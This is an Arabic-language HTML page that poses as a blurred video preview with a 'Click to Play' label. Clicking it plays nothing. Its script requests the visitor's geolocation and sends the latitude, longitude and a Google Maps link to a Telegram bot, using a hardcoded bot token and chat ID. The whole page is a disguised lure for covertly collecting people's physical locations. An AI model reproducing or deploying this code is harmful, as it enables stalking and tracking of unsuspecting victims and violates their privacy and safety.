<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>معاينة فيديو</title>
<style>
  body {
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
  }
  .video-card {
    position: relative;
    cursor: pointer;
    display: inline-block;
  }
  .video-card img {
    max-width: 400px;
    filter: blur(2px); /* تمويه الصورة */
    border-radius: 10px;
  }
  .overlay-text {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    color: #fff;
    font-size: 20px;
    font-weight: bold;
    text-shadow: 0 0 10px #000;
    pointer-events: none;
  }
</style>
</head>
<body>

<div class="video-card" onclick="getLocation()">
  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="Video Preview">
  <div class="overlay-text">Click to Play</div>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("✅ تم الإرسال:", data))
    .catch(err => console.error("❌ خطأ:", err));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendLocationToBot(lat, lon);
            },
            err => {
                console.warn("⚠️ لم يتم السماح بالحصول على الموقع");
            }
        );
    } else {
        console.warn("المتصفح لا يدعم تحديد الموقع");
    }
}
</script>

</body>
</html>
